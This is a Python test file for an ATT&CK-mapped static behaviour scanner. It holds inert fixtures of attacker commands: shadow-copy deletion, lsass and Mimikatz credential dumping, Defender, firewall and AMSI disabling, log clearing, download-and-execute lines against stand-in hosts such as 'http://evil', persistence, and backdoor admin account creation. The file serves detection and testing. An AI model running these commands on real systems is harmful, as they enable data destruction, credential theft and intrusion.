"""Tests for the ATT&CK-mapped static behaviour rules (analyzers/behaviors.py).

Split into three contracts:
  1. attacker tradecraft MUST be detected (true positives, right severity/technique),
  2. benign admin scripts MUST NOT fire (false-positive guards),
  3. the verdict table escalates on the behaviour flags.
All fixtures are inert text — no live malware (CLAUDE.md -> File Analysis).
"""
from __future__ import annotations

from analyzers import behaviors
from analyzers.verdict import compute_verdict
from contract import FLAG_MALICIOUS_BEHAVIOR
from contract import FLAG_SUSPICIOUS_BEHAVIOR
from contract import InspectorResult


def _ids(text):
    return {b["attack_id"] for b in behaviors.scan(text)}


def _sev(text):
    return behaviors.worst_severity(behaviors.scan(text))


# ---- 1. true positives ----------------------------------------------------
def test_shadow_copy_deletion_is_malicious():
    assert "T1490" in _ids("vssadmin delete shadows /all /quiet")
    assert "T1490" in _ids("wmic shadowcopy delete")
    assert "T1490" in _ids("Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }")
    assert _sev("vssadmin delete shadows /all /quiet") == behaviors.MALICIOUS


def test_backup_catalog_deletion_is_malicious():
    assert _sev("wbadmin delete catalog -quiet") == behaviors.MALICIOUS


def test_credential_dumping_is_malicious():
    assert _sev("Invoke-Mimikatz -Command sekurlsa::logonpasswords") == behaviors.MALICIOUS
    assert "T1003.001" in _ids("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 lsass.dmp full")


def test_shellcode_injection_primitives_are_malicious():
    txt = "$b=VirtualAlloc(0,$len,0x3000,0x40); memcpy($b,$sc,$len); CreateRemoteThread($h,0,0,$b,0,0,0)"
    assert _sev(txt) == behaviors.MALICIOUS
    assert "T1055" in _ids(txt)


def test_defender_disable_is_suspicious():
    assert "T1562.001" in _ids("Set-MpPreference -DisableRealtimeMonitoring $true")
    assert "T1562.001" in _ids('reg add "HKLM\\...\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1')
    assert "T1562.001" in _ids("sc stop WinDefend")
    assert _sev("Set-MpPreference -DisableRealtimeMonitoring $true") == behaviors.SUSPICIOUS


def test_firewall_disable_is_suspicious():
    assert "T1562.004" in _ids("netsh advfirewall set allprofiles state off")
    assert "T1562.004" in _ids("Set-NetFirewallProfile -Profile Domain -Enabled False")


def test_download_exec_is_suspicious():
    assert "T1059.001" in _ids("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')")
    assert "T1105" in _ids("certutil -urlcache -split -f http://x/a.exe a.exe")
    assert "T1105" in _ids("bitsadmin /transfer j http://x/a.exe C:\\a.exe")


def test_persistence_is_suspicious():
    assert "T1547.001" in _ids('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v x /d evil.exe')
    assert "T1053.005" in _ids("schtasks /create /tn x /tr evil.exe /sc onlogon")


def test_lolbin_proxy_exec_is_suspicious():
    assert "T1218.005" in _ids("mshta http://evil/x.hta")
    assert "T1218.010" in _ids("regsvr32 /s /u /i:http://evil/x.sct scrobj.dll")


def test_amsi_and_log_clearing():
    assert "T1562.001" in _ids("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
    assert "T1070.001" in _ids("wevtutil cl Security")


def test_behaviour_detected_in_deobfuscated_layer():
    # raw layer is inert; the DECODED layer carries the TTP -> must still fire.
    raw = "powershell -enc <blob>"
    decoded = "vssadmin delete shadows /all /quiet"
    assert "T1490" in {b["attack_id"] for b in behaviors.scan(raw, decoded)}


# ---- 2. false-positive guards ---------------------------------------------
def test_benign_admin_scripts_do_not_fire():
    benign = [
        "whoami; hostname; Get-Date; Get-Process | Select-Object -First 5",
        "Copy-Item C:\\data\\*.txt -Destination D:\\backup\\ -Recurse",
        "Restart-Service -Name Spooler; New-Item C:\\Temp\\r.txt -ItemType File",
        "Get-ChildItem C:\\Users | Measure-Object",
        "$sum=0; 1..100 | ForEach-Object { $sum += $_ }; Write-Output $sum",
        "Invoke-WebRequest https://api.example.com/status -UseBasicParsing",  # download w/o exec != suspicious
        "New-ItemProperty -Path HKCU:\\Software\\MyApp -Name Setting -Value 1",  # non-Run key
    ]
    for s in benign:
        assert behaviors.scan(s) == [], f"false positive on: {s}"


# ---- 3. verdict escalation ------------------------------------------------
def _verdict_for(flag):
    r = InspectorResult(sha256="x", filename="f", customer_code="c", filetype="script")
    r.add_flag(flag)
    return compute_verdict(r.to_dict())


def test_verdict_escalates_on_behaviour_flags():
    assert _verdict_for(FLAG_MALICIOUS_BEHAVIOR) == "malicious"
    assert _verdict_for(FLAG_SUSPICIOUS_BEHAVIOR) == "suspicious"


# ---- 4. expanded technique coverage ---------------------------------------
def test_new_techniques_detected():
    assert "T1140" in _ids("certutil -decode payload.b64 payload.exe")
    assert "T1136.001" in _ids("net user hacker P@ssw0rd /add")
    assert "T1098" in _ids("net localgroup administrators hacker /add")
    assert "T1021.002" in _ids("psexec.exe \\\\victim -u admin -p pass cmd")
    assert "T1047" in _ids("wmic /node:victim process call create calc.exe")
    assert "T1548.002" in _ids('reg add HKLM\\...\\System /v EnableLUA /t REG_DWORD /d 0 /f')
    assert "T1562.001" in _ids('reg add "...\\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f')


def test_macro_style_download_exec_detected():
    vba = 'Set o = CreateObject("WScript.Shell"): o.Run "powershell -enc ZQBjAGgAbwA="'
    assert "T1059.005" in _ids(vba)
    vba2 = 'URLDownloadToFile 0, "http://evil/x.exe", "C:\\x.exe", 0, 0'
    assert "T1059.005" in _ids(vba2)


# ---- 5. cross-analyzer apply() --------------------------------------------
def test_apply_sets_content_and_flag_and_is_idempotent():
    r = InspectorResult(sha256="x", filename="m.docm", customer_code="c", filetype="office")
    behaviors.apply(r, 'Shell("powershell -w hidden -enc AAAA")')
    behaviors.apply(r, "vssadmin delete shadows /all")  # second call merges
    d = r.to_dict()
    ids = {b["attack_id"] for b in d["content"]["behaviors"]}
    assert "T1059.005" in ids and "T1490" in ids
    assert FLAG_MALICIOUS_BEHAVIOR in d["flags"]  # worst severity wins
    # idempotent: re-applying the same text adds nothing
    n = len(d["content"]["behaviors"])
    behaviors.apply(r, "vssadmin delete shadows /all")
    assert len(r.to_dict()["content"]["behaviors"]) == n


def test_new_rules_do_not_fire_on_benign():
    benign = [
        "Invoke-WebRequest https://api.example.com/status -UseBasicParsing",
        "Get-LocalUser | Select-Object Name",              # read, not create
        "wmic cpu get name",                                # query, not process-create
        'Set-ItemProperty HKCU:\\Software\\App -Name Theme -Value "dark"',
        "Restart-Service -Name Spooler",
    ]
    for s in benign:
        assert behaviors.scan(s) == [], f"false positive on: {s}"
